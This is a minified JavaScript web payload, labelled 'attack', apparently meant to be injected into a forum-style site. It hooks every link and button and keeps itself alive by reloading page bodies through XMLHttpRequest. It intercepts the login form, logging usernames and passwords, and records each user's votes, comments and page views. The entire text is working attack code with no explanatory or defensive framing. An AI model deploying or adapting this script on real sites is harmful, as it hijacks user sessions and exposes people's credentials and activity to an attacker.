<script>var globalUsername;function loadContent(e,t,n){xmlhttp=new XMLHttpRequest,xmlhttp.onreadystatechange=function(){4!=xmlhttp.readyState||200!=xmlhttp.status&&302!=xmlhttp.status||t(e,xmlhttp.response)},xmlhttp.open("GET",e,!1),null==n?xmlhttp.send():xmlhttp.send(n)}function postRequest(e,t,n){console.log("will post to "+e+" data is : "+n);var o=new XMLHttpRequest;o.onreadystatechange=function(){4!=o.readyState||200!=o.status&&302!=o.status?console.log("post status: "+o.status):t(e,o.response)},o.open("POST",e,!0),o.setRequestHeader("Content-type","application/x-www-form-urlencoded"),o.send(n)}function replacePage(e,t){var n=document.createElement("html");n.innerHTML=t,yourGlobalVariable=n,document.body.innerHTML=n.getElementsByTagName("body")[0].innerHTML,window.history.pushState("object or string","Title",e),window.dispatchEvent(new HashChangeEvent("hashchange")),addListener(),console.log("page listener add done")}function linkClickHandler(e){console.log("called on "+e.href);e.href.substring(e.href.lastIndexOf("/")+1);var t=e.href;console.log("will fetch "+t),loadContent(t,replacePage)}function buttonClickHandler(e,t){if(console.log("called on submit"+e.id),"login-btn"==e.id){t="post.php";var n=document.getElementById("username").value,o=document.getElementById("userpass").value,l="username="+n+"&password="+o+"&form=login";console.log("will post username  "+n+" password "+o),postRequest(t,replacePage,l)}else if("comment-post-btn"==e.id){t="post.php";var a=document.getElementById("comment").value,s=document.getElementById("parent").value;l="comment="+a+"&form=comment&parent="+s+"&uid="+document.getElementById("uid").value+"&submit=";console.log("will comments on behalf of  "+globalUsername+" parent "+s),postRequest(t,replacePage,l)}else e.id}function normalLinkHandler(e,t){if(String(t).includes("vote.php")){var n=new RegExp(/\\?id=[0-9]+/),o=new RegExp(/vote=[0-9]+/),l=new RegExp(/vote=-\d+$/),a=String(t.match(n)),s=a.substring(a.lastIndexOf("=")+1),r=String(t.match(o));"null"==r&&(r=String(t.match(l)));var d=r.substring(r.lastIndexOf("=")+1);console.log("user vote on post: "+globalUsername+" postid : "+s+" vote val : "+d),loadContent(t,replacePage,"id="+s+"&vote="+d)}else console.log("user view on username: "+globalUsername+" url : "+t),loadContent(t,replacePage);return!1}function addListener(){var e=document.getElementById("logged-in-user");globalUsername=e?e.innerText:null;for(var t=document.links,n=t.length,o=0;o<n;o++){document.getElementById(t[o].id)?document.getElementById(t[o].id).addEventListener("click",function(e){e.preventDefault(),linkClickHandler(e.target||e.srcElement)}):t[o].setAttribute("onclick","normalLinkHandler('"+globalUsername+"','"+t[o].href+"'); return false;")}var l=document.getElementsByTagName("button");for(o=0;o<l.length;o++)l[o].addEventListener("click",function(e){e.preventDefault(),buttonClickHandler(e.target||e.srcElement,document.url)})}function payload(e){addListener()}payload("attack");</script>